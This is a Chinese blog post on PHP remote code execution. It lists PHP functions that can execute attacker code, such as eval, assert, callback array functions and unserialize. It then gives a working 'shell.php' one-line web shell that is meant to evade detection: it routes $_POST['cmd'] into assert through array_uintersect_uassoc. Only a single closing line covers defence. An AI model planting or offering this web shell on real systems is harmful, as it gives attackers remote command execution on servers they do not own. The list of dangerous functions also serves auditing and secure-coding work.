---
layout: post
title:  "远程命令执行漏洞"
categories: Remote code execution
tags:  Remote 一句话木马
author: Hannoch
---

* content
{:toc}

# 前言
	远程命令执行漏洞，用户通过浏览器提交执行命令，由于服务器端没有针对执行函
数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变
$PATH（变量）或程序执行环境的其他方面来执行一个恶意构造的代码。
来源：百度百科
# 远程代码执行原理
	客户端向服务器发送恶意请求，该请求内容中有服务器端可执行的代码，服务器端接收请求后未
对来源数据做出过滤/拦截操作，从而造成代码执行漏洞。

# 远程代码执行常见点

```php
eval()
preg_replace("//e",$_GET['h'],"");
array_map()
usort(),uasort(),uksort()
array_filter()
array_reduce()
array_diff_uassoc(),array_diff_ukey()
array_udiff(),array_udiff_assoc(),
array_udiff_uassoc()
array_intersect_assoc(),array_intersect_uassoc()
array_uintersect(),array_uintersect_assoc(),
array_uintersect_uassoc()
array_walk(),array_walk_recursive()
xml_set_character_data_handler()
xml_set_default_handler()
xml_set_element_handler()
ob_start()
unserialize()
xml_set_end_namespace_decl_handler()
xml_set_external_entity_ref_handler()
xml_set_notation_decl_handler()
xml_set_processing_instruction_handler()
xml_set_start_namespace_decl_handler()
xml_set_unparsed_entity_decl_handler()
stream_filter_register()
set_error_handler()
register_shutdown_function()
register_tick_function()
assert()
```

# 生僻函数免杀一句话
[PHP array_uintersect_uassoc() 函数](http://www.w3school.com.cn/php/func_array_uintersect_uassoc.asp)
比较两个数组的键名和键值（使用用户自定义函数进行比较），并返回交集（匹配）：

```php
<?php
function myfunction_key($a,$b)
{
if ($a===$b)
  {
  return 0;
  }
  return ($a>$b)?1:-1;
}

function myfunction_value($a,$b)
{
if ($a===$b)
  {
  return 0;
  }
  return ($a>$b)?1:-1;
}

$a1=array("a"=>"red","b"=>"green","c"=>"blue");
$a2=array("a"=>"red","b"=>"green","c"=>"green");

$result=array_uintersect_uassoc($a1,$a2,"myfunction_key","myfunction_value");
print_r($result);
?>
```
语法
`array_uintersect_uassoc(array1,array2,array3...,myfunction_key,myfunction_value)`
参数	描述
**array1** 必需。与其他数组进行比较的第一个数组。
**array2**	必需。与第一个数组进行比较的数组。
**array3,...**	可选。与第一个数组进行比较的其他数组。
** myfunction_key ** 必需。用于比较数组键名的用户自定义函数的名称。

定义可调用的比较函数。如果第一个参数小于等于或大于第二个参数，则比较函数必须返回小于等于或大于 0 的整数。

** myfunction_value ** 必需。用于比较数组键值的用户自定义函数的名称。

定义可调用的比较函数。如果第一个参数小于等于或大于第二个参数，则比较函数必须返回小于等于或大于 0 的整数。

使用用户自定义的回调函数 myfunction_key 和 myfunction_value 来计算两个或多个数组的交集（即在 array1 中存在，同时也在其它任何数组中存在的所有数组元素），并返回结果数组。

同时进行键名和键值的比较，如 "a"=>1 和 "b"=>1 这两个元素是不相等的。

myfunction_key 指定的函数用于比较键名是否相等。myfunction_value 指定的函数用于比较键值是否相等。这两个函数都带有两个将进行比较的参数。如果第一个参数小于第二个参数，则函数返回一个负数，如果两个参数相等，则要返回 0，如果第一个参数大于第二个，则返回一个正数。

返回的数组中键名保持不变。

生成我们的一句话木马
shell.php
```php
$a1=array($_POST['cmd']);
$a2=array($_POST['cmd']);
$result=array_uintersect_uassoc($a1,$a2,"assert","assert");
```

防护：在开发中尽量不要使用危险函数，输入的变量一定要进行过滤。
